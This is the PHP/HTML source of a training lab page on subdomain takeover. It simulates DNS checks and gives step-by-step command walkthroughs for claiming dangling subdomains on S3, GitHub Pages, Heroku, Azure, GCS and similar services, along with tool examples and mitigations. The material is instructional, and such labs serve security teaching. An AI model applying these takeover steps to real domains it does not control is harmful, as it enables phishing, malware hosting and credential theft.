<?php
// Lab 1: Basic Subdomain Takeover
// Vulnerability: Basic subdomain takeover vulnerabilities

session_start();

$message = '';
$subdomain = $_GET['subdomain'] ?? '';
$dns_records = [];
$takeover_status = 'unknown';

// Simulate DNS lookup and subdomain takeover detection
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    
    if ($action === 'check_subdomain') {
        $subdomain = $_POST['subdomain'] ?? '';
        
        if (!empty($subdomain)) {
            // Simulate DNS lookup
            $dns_records = [
                'A' => ['192.168.1.100'],
                'CNAME' => ['vulnerable-service.example.com'],
                'TXT' => ['v=spf1 include:_spf.google.com ~all']
            ];
            
            // Simulate takeover detection
            if (strpos($subdomain, 'vulnerable') !== false) {
                $takeover_status = 'vulnerable';
                $message = '<div class="alert alert-danger">⚠️ VULNERABLE: This subdomain can be taken over!</div>';
            } elseif (strpos($subdomain, 'secure') !== false) {
                $takeover_status = 'secure';
                $message = '<div class="alert alert-success">✅ SECURE: This subdomain is properly configured.</div>';
            } else {
                $takeover_status = 'unknown';
                $message = '<div class="alert alert-info">ℹ️ UNKNOWN: Unable to determine takeover status.</div>';
            }
        } else {
            $message = '<div class="alert alert-warning">⚠️ Please enter a subdomain to check.</div>';
        }
    } elseif ($action === 'simulate_takeover') {
        $subdomain = $_POST['subdomain'] ?? '';
        $payload = $_POST['payload'] ?? '';
        
        if (!empty($subdomain) && !empty($payload)) {
            $message = '<div class="alert alert-warning">⚠️ Takeover simulation initiated for: ' . htmlspecialchars($subdomain) . '</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 1: Basic Subdomain Takeover - Subdomain Takeover Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .result-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .subdomain-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }

        .vulnerable-form {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .dns-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .dns-record {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border: 1px solid #334155;
        }

        .subdomain-takeover-techniques {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .technique-card {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            border: 1px solid #334155;
        }

        .technique-title {
            color: var(--accent-green);
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        .technique-demo {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 4px;
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }

        .status-vulnerable {
            color: var(--accent-red);
            font-weight: bold;
        }

        .status-secure {
            color: var(--accent-green);
            font-weight: bold;
        }

        .status-unknown {
            color: var(--accent-orange);
            font-weight: bold;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Subdomain Takeover Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 1: Basic Subdomain Takeover</h1>
            <p class="hero-subtitle">Basic subdomain takeover vulnerabilities</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Low</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates basic subdomain takeover vulnerabilities where attackers can take control of subdomains that are no longer in use but still point to external services.</p>
            <p><strong>Objective:</strong> Understand how basic subdomain takeover attacks work and how to exploit them.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-globe me-2"></i>Subdomain Takeover Scanner
                    </div>
                    <div class="card-body">
                        <div class="vulnerable-form">
                            <h5>Check Subdomain</h5>
                            <p>This tool checks if a subdomain is vulnerable to takeover:</p>
                            
                            <form method="POST">
                                <input type="hidden" name="action" value="check_subdomain">
                                <div class="mb-3">
                                    <label for="subdomain" class="form-label">Subdomain to Check</label>
                                    <input type="text" class="form-control" id="subdomain" name="subdomain" placeholder="vulnerable.example.com" value="<?php echo htmlspecialchars($subdomain); ?>" required>
                                </div>
                                <button type="submit" class="btn btn-primary">Check Subdomain</button>
                            </form>
                            
                            <?php echo $message; ?>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-shield-exclamation me-2"></i>Takeover Tester
                    </div>
                    <div class="card-body">
                        <div class="subdomain-warning">
                            <h5>⚠️ Subdomain Takeover Warning</h5>
                            <p>This lab demonstrates subdomain takeover vulnerabilities:</p>
                            <ul>
                                <li><code>DNS Misconfiguration</code> - Pointing to non-existent services</li>
                                <li><code>Service Deletion</code> - Services deleted but DNS still points</li>
                                <li><code>Weak Authentication</code> - Weak service authentication</li>
                                <li><code>No Validation</code> - No subdomain validation</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Test Subdomains</h5>
                            <p>Try these test subdomains:</p>
                            <ul>
                                <li><code>vulnerable.example.com</code> - Vulnerable to takeover</li>
                                <li><code>secure.example.com</code> - Properly secured</li>
                                <li><code>unknown.example.com</code> - Unknown status</li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testSubdomainTakeover()" class="btn btn-primary">Test Takeover</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <?php if (!empty($dns_records)): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-diagram-2 me-2"></i>DNS Records for <?php echo htmlspecialchars($subdomain); ?>
                    </div>
                    <div class="card-body">
                        <div class="dns-display">
                            <?php foreach ($dns_records as $type => $records): ?>
                            <div class="dns-record">
                                <div class="row align-items-center">
                                    <div class="col-md-2">
                                        <strong><?php echo $type; ?> Record</strong>
                                    </div>
                                    <div class="col-md-8">
                                        <?php foreach ($records as $record): ?>
                                        <span class="text-info"><?php echo htmlspecialchars($record); ?></span><br>
                                        <?php endforeach; ?>
                                    </div>
                                    <div class="col-md-2">
                                        <span class="text-muted">TTL: 300</span>
                                    </div>
                                </div>
                            </div>
                            <?php endforeach; ?>
                        </div>
                        
                        <div class="mt-3">
                            <h5>Takeover Status: <span class="status-<?php echo $takeover_status; ?>"><?php echo ucfirst($takeover_status); ?></span></h5>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Basic Subdomain Takeover Techniques
                    </div>
                    <div class="card-body">
                        <div class="subdomain-takeover-techniques">
                            <div class="technique-card">
                                <div class="technique-title">DNS Enumeration</div>
                                <div class="technique-demo"># Enumerate subdomains
dig @8.8.8.8 example.com ANY
nslookup subdomain.example.com
host subdomain.example.com</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">CNAME Check</div>
                                <div class="technique-demo"># Check CNAME records
dig subdomain.example.com CNAME
# Look for services like:
# - *.s3.amazonaws.com
# - *.herokuapp.com
# - *.github.io</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Service Verification</div>
                                <div class="technique-demo"># Check if service exists
curl -I https://subdomain.example.com
# Look for 404 errors or
# "NoSuchBucket" errors</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Takeover Confirmation</div>
                                <div class="technique-demo"># Confirm takeover
# 1. Register service
# 2. Point subdomain to service
# 3. Verify control
# 4. Host malicious content</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Payload Delivery</div>
                                <div class="technique-demo"># Host malicious content
# - Phishing pages
# - Malware distribution
# - Credential harvesting
# - XSS payloads</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Impact Assessment</div>
                                <div class="technique-demo"># Assess impact
# - Brand reputation damage
# - Credential theft
# - Phishing attacks
# - SEO manipulation</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Basic Subdomain Takeover</li>
                        <li><strong>Severity:</strong> Medium</li>
                        <li><strong>Method:</strong> DNS misconfiguration</li>
                        <li><strong>Issue:</strong> Service deletion without DNS cleanup</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>DNS Enumeration:</strong> Find vulnerable subdomains</li>
                        <li><strong>CNAME Check:</strong> Check CNAME records</li>
                        <li><strong>Service Verification:</strong> Verify service existence</li>
                        <li><strong>Takeover Confirmation:</strong> Confirm takeover</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Basic Subdomain Takeover Examples</h5>
            <p>Use these techniques to exploit basic subdomain takeover vulnerabilities:</p>
            
            <h6>1. DNS Enumeration:</h6>
            <div class="code-block"># Enumerate subdomains
dig @8.8.8.8 example.com ANY
nslookup subdomain.example.com
host subdomain.example.com

# Use tools like:
# - subfinder
# - amass
# - assetfinder
# - findomain</div>

            <h6>2. CNAME Record Check:</h6>
            <div class="code-block"># Check CNAME records
dig subdomain.example.com CNAME

# Look for vulnerable services:
# - *.s3.amazonaws.com
# - *.herokuapp.com
# - *.github.io
# - *.netlify.app
# - *.vercel.app</div>

            <h6>3. Service Verification:</h6>
            <div class="code-block"># Check if service exists
curl -I https://subdomain.example.com
curl -I http://subdomain.example.com

# Look for:
# - 404 errors
# - "NoSuchBucket" errors
# - "NoSuchKey" errors
# - "Not Found" errors</div>

            <h6>4. AWS S3 Bucket Takeover:</h6>
            <div class="code-block"># Check S3 bucket
aws s3 ls s3://subdomain.example.com

# If bucket doesn't exist:
# 1. Create bucket with same name
# 2. Upload malicious content
# 3. Verify takeover

# Example bucket creation:
aws s3 mb s3://subdomain.example.com
echo "Subdomain Takeover" > index.html
aws s3 cp index.html s3://subdomain.example.com/</div>

            <h6>5. GitHub Pages Takeover:</h6>
            <div class="code-block"># Check GitHub Pages
curl -I https://subdomain.example.com

# If 404 error:
# 1. Create GitHub repository
# 2. Enable GitHub Pages
# 3. Upload malicious content
# 4. Verify takeover

# Repository setup:
git init
echo "Subdomain Takeover" > index.html
git add .
git commit -m "Initial commit"
git push origin main</div>

            <h6>6. Heroku App Takeover:</h6>
            <div class="code-block"># Check Heroku app
curl -I https://subdomain.example.com

# If 404 error:
# 1. Create Heroku app
# 2. Deploy malicious content
# 3. Verify takeover

# Heroku deployment:
heroku create subdomain-example-com
echo "Subdomain Takeover" > index.html
git add .
git commit -m "Initial commit"
git push heroku main</div>

            <h6>7. Netlify Takeover:</h6>
            <div class="code-block"># Check Netlify site
curl -I https://subdomain.example.com

# If 404 error:
# 1. Create Netlify site
# 2. Upload malicious content
# 3. Verify takeover

# Netlify deployment:
netlify deploy --dir . --prod
# Or drag and drop to Netlify dashboard</div>

            <h6>8. Vercel Takeover:</h6>
            <div class="code-block"># Check Vercel site
curl -I https://subdomain.example.com

# If 404 error:
# 1. Create Vercel project
# 2. Deploy malicious content
# 3. Verify takeover

# Vercel deployment:
vercel --prod
# Or connect GitHub repository</div>

            <h6>9. Firebase Hosting Takeover:</h6>
            <div class="code-block"># Check Firebase site
curl -I https://subdomain.example.com

# If 404 error:
# 1. Create Firebase project
# 2. Deploy malicious content
# 3. Verify takeover

# Firebase deployment:
firebase init hosting
firebase deploy</div>

            <h6>10. Azure Blob Storage Takeover:</h6>
            <div class="code-block"># Check Azure blob
curl -I https://subdomain.example.com

# If 404 error:
# 1. Create Azure storage account
# 2. Create blob container
# 3. Upload malicious content
# 4. Verify takeover

# Azure CLI:
az storage account create --name subdomainexamplecom
az storage container create --name $web
az storage blob upload --file index.html --container-name $web</div>

            <h6>11. Google Cloud Storage Takeover:</h6>
            <div class="code-block"># Check GCS bucket
curl -I https://subdomain.example.com

# If 404 error:
# 1. Create GCS bucket
# 2. Upload malicious content
# 3. Verify takeover

# GCS CLI:
gsutil mb gs://subdomain.example.com
gsutil cp index.html gs://subdomain.example.com/</div>

            <h6>12. Cloudflare Pages Takeover:</h6>
            <div class="code-block"># Check Cloudflare Pages
curl -I https://subdomain.example.com

# If 404 error:
# 1. Create Cloudflare Pages project
# 2. Deploy malicious content
# 3. Verify takeover

# Cloudflare Pages deployment:
# Upload files via dashboard or connect Git repository</div>

            <h6>13. Automated Takeover Detection:</h6>
            <div class="code-block"># Use automated tools
# - subjack
# - takeover
# - subzy
# - subdomain-takeover

# Example with subjack:
subjack -w subdomains.txt -t 100 -o results.txt

# Example with takeover:
takeover -l subdomains.txt -t 10</div>

            <h6>14. Manual Verification:</h6>
            <div class="code-block"># Manual verification steps
# 1. Check DNS records
# 2. Verify service existence
# 3. Test for 404 errors
# 4. Attempt service registration
# 5. Confirm takeover
# 6. Document findings</div>

            <h6>15. Impact Assessment:</h6>
            <div class="code-block"># Assess takeover impact
# - Brand reputation damage
# - Credential theft potential
# - Phishing attack vectors
# - SEO manipulation
# - Trust and security implications

# Document findings:
# - Vulnerable subdomains
# - Affected services
# - Potential impact
# - Remediation steps</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Brand reputation damage and trust issues</li>
                <li>Credential theft and session hijacking</li>
                <li>Phishing attacks and social engineering</li>
                <li>Compliance violations and legal issues</li>
                <li>Data exfiltration and privacy breaches</li>
                <li>SEO manipulation and search engine abuse</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Regular DNS record auditing and cleanup</li>
                    <li>Implement proper subdomain monitoring</li>
                    <li>Use secure service configurations</li>
                    <li>Implement proper authentication and authorization</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual subdomain activity</li>
                    <li>Implement proper DNS security controls</li>
                    <li>Use secure coding practices</li>
                    <li>Implement proper error handling</li>
                    <li>Educate users about security threats</li>
                    <li>Use multi-factor authentication</li>
                    <li>Implement proper logging and monitoring</li>
                    <li>Use subdomain takeover detection tools</li>
                    <li>Implement proper audit trails</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testSubdomainTakeover() {
            alert('Subdomain Takeover test initiated. Try the takeover techniques above.');
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
